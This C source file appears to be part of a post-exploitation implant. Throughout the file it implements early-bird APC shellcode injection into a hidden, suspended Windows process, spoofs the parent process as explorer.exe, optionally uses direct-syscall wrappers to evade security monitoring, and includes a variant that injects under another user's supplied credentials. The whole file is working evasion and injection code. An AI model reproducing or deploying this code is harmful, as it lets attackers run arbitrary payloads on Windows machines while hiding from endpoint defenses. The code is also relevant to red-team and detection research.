#define _WIN32_WINNT 0x0601
#include "inject.h"
#ifdef EVASION_SYSCALLS
#include "evasion.h"
#endif

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#if defined(INCLUDE_CMD_SPAWN) || defined(INCLUDE_CMD_SPAWNTO) || defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_SPAWNAS)

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

char g_spawnto_path[512] = INJECT_DEFAULT_SPAWNTO;

static DWORD find_explorer_pid(void) {
    DWORD  pid   = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(hSnap, &pe)) do {
        if (_stricmp(pe.szExeFile, "explorer.exe") == 0 && !pid)
            pid = pe.th32ProcessID;
    } while (Process32Next(hSnap, &pe));
    CloseHandle(hSnap);
    return pid;
}

int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
                     const char *cmdline_override,
                     EarlyBirdResult *out, char *errmsg, size_t errmsg_len) {
    /* Resolve host process full path */
    wchar_t whost_name[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, g_spawnto_path, -1, whost_name, 512);
    wchar_t whost_full[512] = {0};
    if (!strchr(g_spawnto_path, '\\') && !strchr(g_spawnto_path, '/')) {
        DWORD ret = SearchPathW(NULL, whost_name, NULL, 512, whost_full, NULL);
        if (ret == 0 || ret >= 512) {
            snprintf(errmsg, errmsg_len, "Error: '%s' not found in PATH", g_spawnto_path);
            return 0;
        }
    } else {
        wcsncpy(whost_full, whost_name, 511);
    }

    /* PPID spoof: explorer.exe */
    DWORD  spoof_pid = find_explorer_pid();
    HANDLE hParent   = spoof_pid ? OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid) : NULL;
    BOOL   use_spoof = FALSE;
    LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;

    if (hParent) {
        SIZE_T attr_size = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
        attr = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
        if (attr && InitializeProcThreadAttributeList(attr, 1, 0, &attr_size)) {
            if (UpdateProcThreadAttribute(attr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                          &hParent, sizeof(hParent), NULL, NULL))
                use_spoof = TRUE;
            else { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); attr = NULL; }
        } else {
            if (attr) { HeapFree(GetProcessHeap(), 0, attr); attr = NULL; }
        }
    }

    /* Build lpCommandLine (mutable wide string required by CreateProcessW) */
    wchar_t wcmdline[2048] = {0};
    if (cmdline_override)
        MultiByteToWideChar(CP_UTF8, 0, cmdline_override, -1, wcmdline, 2048);
    else
        wcsncpy(wcmdline, whost_full, 2047);

    STARTUPINFOEXW siex;
    ZeroMemory(&siex, sizeof(siex));
    siex.StartupInfo.cb          = use_spoof ? (DWORD)sizeof(siex) : (DWORD)sizeof(STARTUPINFOW);
    siex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
    siex.StartupInfo.wShowWindow = SW_HIDE;
    if (use_spoof) siex.lpAttributeList = attr;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    DWORD cflags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (use_spoof) cflags |= EXTENDED_STARTUPINFO_PRESENT;

    BOOL ok = CreateProcessW(whost_full, wcmdline, NULL, NULL, FALSE,
                             cflags, NULL, NULL, &siex.StartupInfo, &pi);
    if (use_spoof) { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); }
    if (hParent) CloseHandle(hParent);

    if (!ok) {
        snprintf(errmsg, errmsg_len, "Error: CreateProcess(%s) failed (%lu)",
                 g_spawnto_path, GetLastError());
        return 0;
    }

    /* Alloc RW in remote process */
    LPVOID rmem = NULL;
#ifdef EVASION_SYSCALLS
    PVOID  base = NULL;
    SIZE_T rsz  = shellcode_len;
    NTSTATUS st = kratos_NtAllocateVirtualMemory(pi.hProcess, &base, 0, &rsz,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
    rmem = base;
#else
    rmem = VirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rmem) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: VirtualAllocEx failed (%lu)", GetLastError());
        return 0;
    }
#endif

    /* Write shellcode */
    SIZE_T written = 0;
#ifdef EVASION_SYSCALLS
    st = kratos_NtWriteVirtualMemory(pi.hProcess, rmem, (PVOID)shellcode, shellcode_len, &written);
    if (!NT_SUCCESS(st) || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtWriteVirtualMemory failed");
        return 0;
    }
#else
    if (!WriteProcessMemory(pi.hProcess, rmem, shellcode, shellcode_len, &written)
            || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: WriteProcessMemory failed");
        return 0;
    }
#endif

    /* Flip RW -> RX */
#ifdef EVASION_SYSCALLS
    PVOID  prot_base = rmem;
    SIZE_T prot_sz   = shellcode_len;
    ULONG  old_prot  = 0;
    kratos_NtProtectVirtualMemory(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
#else
    DWORD old_prot = 0;
    VirtualProtectEx(pi.hProcess, rmem, shellcode_len, PAGE_EXECUTE_READ, &old_prot);
#endif

    /* Queue APC - fires inside LdrInitializeThunk (alertable wait, before CFG active) */
#ifdef EVASION_SYSCALLS
    st = kratos_NtQueueApcThread(pi.hThread, rmem, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtQueueApcThread failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
#else
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: QueueUserAPC failed (%lu)", GetLastError());
        return 0;
    }
#endif

    ResumeThread(pi.hThread);

    out->hProcess = pi.hProcess;
    out->hThread  = pi.hThread;
    out->pid      = pi.dwProcessId;
    return 1;
}

#ifdef INCLUDE_CMD_SPAWNAS

int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len,
                             const char *username, const char *domain, const char *password,
                             EarlyBirdResult *out, char *errmsg, size_t errmsg_len) {
    /* Resolve host process full path */
    wchar_t whost_name[512] = {0};
    MultiByteToWideChar(CP_UTF8, 0, g_spawnto_path, -1, whost_name, 512);
    wchar_t whost_full[512] = {0};
    if (!strchr(g_spawnto_path, '\\') && !strchr(g_spawnto_path, '/')) {
        DWORD ret = SearchPathW(NULL, whost_name, NULL, 512, whost_full, NULL);
        if (ret == 0 || ret >= 512) {
            snprintf(errmsg, errmsg_len, "Error: '%s' not found in PATH", g_spawnto_path);
            return 0;
        }
    } else {
        wcsncpy(whost_full, whost_name, 511);
    }

    wchar_t wuser[256]   = {0};
    wchar_t wdomain[256] = {0};
    wchar_t wpass[256]   = {0};
    MultiByteToWideChar(CP_UTF8, 0, username, -1, wuser, 256);
    MultiByteToWideChar(CP_UTF8, 0, (domain && domain[0]) ? domain : ".", -1, wdomain, 256);
    MultiByteToWideChar(CP_UTF8, 0, password, -1, wpass, 256);

    wchar_t wcmdline[2048] = {0};
    wcsncpy(wcmdline, whost_full, 2047);

    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    BOOL ok = CreateProcessWithLogonW(
        wuser, wdomain, wpass,
        LOGON_WITH_PROFILE,
        whost_full, wcmdline,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );
    if (!ok) {
        snprintf(errmsg, errmsg_len, "Error: CreateProcessWithLogonW(%s\\%s) failed (%lu)",
                 domain && domain[0] ? domain : ".", username, GetLastError());
        return 0;
    }

    /* Alloc RW in remote process */
    LPVOID rmem = NULL;
#ifdef EVASION_SYSCALLS
    PVOID  base = NULL;
    SIZE_T rsz  = shellcode_len;
    NTSTATUS st = kratos_NtAllocateVirtualMemory(pi.hProcess, &base, 0, &rsz,
                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtAllocateVirtualMemory failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
    rmem = base;
#else
    rmem = VirtualAllocEx(pi.hProcess, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!rmem) {
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: VirtualAllocEx failed (%lu)", GetLastError());
        return 0;
    }
#endif

    /* Write shellcode */
    SIZE_T written = 0;
#ifdef EVASION_SYSCALLS
    st = kratos_NtWriteVirtualMemory(pi.hProcess, rmem, (PVOID)shellcode, shellcode_len, &written);
    if (!NT_SUCCESS(st) || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtWriteVirtualMemory failed");
        return 0;
    }
#else
    if (!WriteProcessMemory(pi.hProcess, rmem, shellcode, shellcode_len, &written)
            || written != shellcode_len) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: WriteProcessMemory failed");
        return 0;
    }
#endif

    /* Flip RW -> RX */
#ifdef EVASION_SYSCALLS
    PVOID  prot_base = rmem;
    SIZE_T prot_sz   = shellcode_len;
    ULONG  old_prot  = 0;
    kratos_NtProtectVirtualMemory(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
#else
    DWORD old_prot = 0;
    VirtualProtectEx(pi.hProcess, rmem, shellcode_len, PAGE_EXECUTE_READ, &old_prot);
#endif

    /* Queue APC */
#ifdef EVASION_SYSCALLS
    st = kratos_NtQueueApcThread(pi.hThread, rmem, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: NtQueueApcThread failed (0x%08lX)", (unsigned long)st);
        return 0;
    }
#else
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)rmem, pi.hThread, 0)) {
        VirtualFreeEx(pi.hProcess, rmem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        snprintf(errmsg, errmsg_len, "Error: QueueUserAPC failed (%lu)", GetLastError());
        return 0;
    }
#endif

    ResumeThread(pi.hThread);

    out->hProcess = pi.hProcess;
    out->hThread  = pi.hThread;
    out->pid      = pi.dwProcessId;
    return 1;
}

#endif /* INCLUDE_CMD_SPAWNAS */

#endif /* INCLUDE_CMD_SPAWN || INCLUDE_CMD_SPAWNTO || INCLUDE_CMD_LIGOLO_START || INCLUDE_CMD_SPAWNAS */
